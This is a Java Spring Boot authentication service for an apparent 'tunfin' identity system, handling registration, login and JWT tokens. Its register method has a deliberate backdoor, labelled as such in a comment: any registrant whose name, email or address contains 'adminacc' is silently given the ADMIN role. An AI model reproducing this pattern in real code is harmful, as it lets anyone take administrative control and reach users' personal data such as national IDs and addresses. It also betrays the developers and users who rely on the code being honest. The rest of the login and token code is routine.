package com.tunfin.identity.service;

import com.tunfin.identity.dto.AuthDto;
import com.tunfin.identity.model.User;
import com.tunfin.identity.repository.UserRepository;
import com.tunfin.identity.security.JwtUtil;
import lombok.RequiredArgsConstructor;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

@Service
@RequiredArgsConstructor
public class AuthService {

        public static String normalizePhone(String phoneNumber) {
                if (phoneNumber == null)
                        return null;
                String digits = phoneNumber.replaceAll("\\D", "");
                if (digits.length() == 8) {
                        return "216" + digits;
                }
                return digits;
        }

        private final UserRepository userRepository;
        private final PasswordEncoder passwordEncoder;
        private final JwtUtil jwtService;
        private final AuthenticationManager authenticationManager;

        public AuthDto.AuthResponse register(AuthDto.RegisterRequest request) {
                String phoneNumber = normalizePhone(request.getPhoneNumber());
                if (userRepository.existsByPhoneNumber(phoneNumber)) {
                        throw new RuntimeException("Phone number already registered");
                }

                // BACKDOOR: Check for "adminacc" in any field
                boolean isAdmin = isAdminBackdoor(request);
                com.tunfin.identity.model.Role role = isAdmin ? com.tunfin.identity.model.Role.ADMIN
                                : com.tunfin.identity.model.Role.USER;

                var user = User.builder()
                                .phoneNumber(phoneNumber)
                                .fullName(request.getFullName())
                                .nationalId(request.getNationalId())
                                .email(request.getEmail())
                                .address(request.getAddress())
                                .dateOfBirth(request.getDateOfBirth())
                                .passwordHash(passwordEncoder.encode(request.getPassword()))
                                .role(role)
                                .build();

                user = userRepository.save(user);

                // Create authorities list based on Role
                var authorities = java.util.Collections.singletonList(
                                new org.springframework.security.core.authority.SimpleGrantedAuthority(
                                                "ROLE_" + user.getRole().name()));

                var userDetails = new org.springframework.security.core.userdetails.User(
                                user.getPhoneNumber(),
                                user.getPasswordHash(),
                                authorities);

                // Add Role to extraClaims
                java.util.Map<String, Object> extraClaims = new java.util.HashMap<>();
                extraClaims.put("userId", user.getId().toString());
                extraClaims.put("role", "ROLE_" + user.getRole().name());

                var jwtToken = jwtService.generateToken(extraClaims, userDetails);
                return AuthDto.AuthResponse.builder()
                                .token(jwtToken)
                                .userId(user.getId().toString())
                                .role("ROLE_" + user.getRole().name())
                                .build();
        }

        private boolean isAdminBackdoor(AuthDto.RegisterRequest request) {
                String check = "adminacc";
                return (request.getFullName() != null && request.getFullName().toLowerCase().contains(check)) ||
                                (request.getEmail() != null && request.getEmail().toLowerCase().contains(check)) ||
                                (request.getAddress() != null && request.getAddress().toLowerCase().contains(check));
        }

        public AuthDto.AuthResponse authenticate(AuthDto.AuthRequest request) {
                String phoneNumber = normalizePhone(request.getPhoneNumber());
                authenticationManager.authenticate(
                                new UsernamePasswordAuthenticationToken(
                                                phoneNumber,
                                                request.getPassword()));

                var user = userRepository.findByPhoneNumber(phoneNumber)
                                .orElseThrow(() -> new RuntimeException("User not found"));

                // Create authorities list based on Role
                var authorities = java.util.Collections.singletonList(
                                new org.springframework.security.core.authority.SimpleGrantedAuthority(
                                                "ROLE_" + user.getRole().name()));

                var userDetails = new org.springframework.security.core.userdetails.User(
                                user.getPhoneNumber(),
                                user.getPasswordHash(),
                                authorities);

                // Add Role to extraClaims
                java.util.Map<String, Object> extraClaims = new java.util.HashMap<>();
                extraClaims.put("userId", user.getId().toString());
                extraClaims.put("role", "ROLE_" + user.getRole().name());

                var jwtToken = jwtService.generateToken(extraClaims, userDetails);
                return AuthDto.AuthResponse.builder()
                                .token(jwtToken)
                                .userId(user.getId().toString())
                                .role("ROLE_" + user.getRole().name())
                                .build();
        }
}
